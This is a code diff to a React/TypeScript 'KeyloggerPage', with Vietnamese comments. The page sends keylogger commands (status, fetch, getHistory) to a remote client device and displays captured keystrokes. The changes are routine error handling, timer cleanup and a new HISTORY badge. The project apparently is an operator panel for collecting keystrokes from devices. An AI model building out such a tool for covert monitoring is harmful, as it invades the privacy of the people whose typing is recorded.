@@ -1,4 +1,4 @@
-import { useCallback, useEffect, useState } from 'react';
+import { useCallback, useEffect, useState, useRef } from 'react';
 import { useOutletContext } from 'react-router-dom';
 import { useDeviceData } from '@/hooks/useDeviceData';
 import type { DeviceOutletContext, KeystrokeEntry } from '@/types';
@@ -35,6 +35,7 @@ export default function KeyloggerPage() {
     checkedAt: null,
   });
   const [statusLoading, setStatusLoading] = useState(false);
+  const statusTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
 
   // Tự động fetch trạng thái khi vào trang
   const fetchStatus = useCallback(async () => {
@@ -51,8 +52,9 @@ export default function KeyloggerPage() {
       }
     } catch {
       // Không hiển thị lỗi — chỉ để trống
+    } finally {
+      setStatusLoading(false);
     }
-    setStatusLoading(false);
   }, [clientId]);
 
   // Gửi lệnh status đến thiết bị để cập nhật trạng thái mới nhất
@@ -60,25 +62,38 @@ export default function KeyloggerPage() {
     setStatusLoading(true);
     try {
       await sendCommand(CMD.KEYLOGGER, { action: 'status' });
-      // Đợi socket broadcast về rồi fetch lại
-      setTimeout(() => {
-        fetchStatus();
-      }, 1500);
     } catch {
-      setStatusLoading(false);
+      // sendCommand tự hiển thị lỗi qua commandStatus
     }
+    // Fetch sau 1.5s để đợi socket broadcast; có finally trong fetchStatus nên loading luôn được clear
+    const timer = setTimeout(() => {
+      fetchStatus();
+    }, 1500);
+    // Store for cleanup
+    statusTimerRef.current = timer;
   }, [sendCommand, fetchStatus]);
 
   useEffect(() => {
     fetchStatus();
+    return () => {
+      if (statusTimerRef.current) clearTimeout(statusTimerRef.current);
+    };
   }, [fetchStatus]);
 
   const fetchKeylogger = useCallback(async () => {
-    await sendCommand(CMD.KEYLOGGER, { action: 'fetch' });
+    try {
+      await sendCommand(CMD.KEYLOGGER, { action: 'fetch' });
+    } catch {
+      // Lỗi đã được hiển thị qua commandStatus
+    }
   }, [sendCommand]);
 
   const getHistory = useCallback(async () => {
-    await sendCommand(CMD.KEYLOGGER, { action: 'getHistory' });
+    try {
+      await sendCommand(CMD.KEYLOGGER, { action: 'getHistory' });
+    } catch {
+      // Lỗi đã được hiển thị qua commandStatus
+    }
   }, [sendCommand]);
 
   const formatCheckedAt = (iso: string | null): string => {
@@ -158,8 +173,12 @@ export default function KeyloggerPage() {
             <Card key={`ks-${item.timestamp}-${i}`} className="shadow-none">
               <CardContent className="p-3">
                 <div className="flex items-center gap-2 mb-1.5 flex-wrap">
-                  <Badge variant="outline" className={`text-[9px] px-1 py-0 ${item.type === 'offline' ? 'border-blue-400/30 text-blue-500' : 'border-green-400/30 text-green-500'}`}>
-                    {item.type === 'offline' ? 'OFFLINE' : 'LIVE'}
+                  <Badge variant="outline" className={`text-[9px] px-1 py-0 ${
+                    item.type === 'offline' ? 'border-blue-400/30 text-blue-500' :
+                    item.type === 'history' ? 'border-amber-400/30 text-amber-600' :
+                    'border-green-400/30 text-green-500'
+                  }`}>
+                    {item.type === 'offline' ? 'OFFLINE' : item.type === 'history' ? 'HISTORY' : 'LIVE'}
                   </Badge>
                   {item.eventType && (
                     <Badge variant="secondary" className="text-[9px] px-1 py-0">{item.eventType}</Badge>
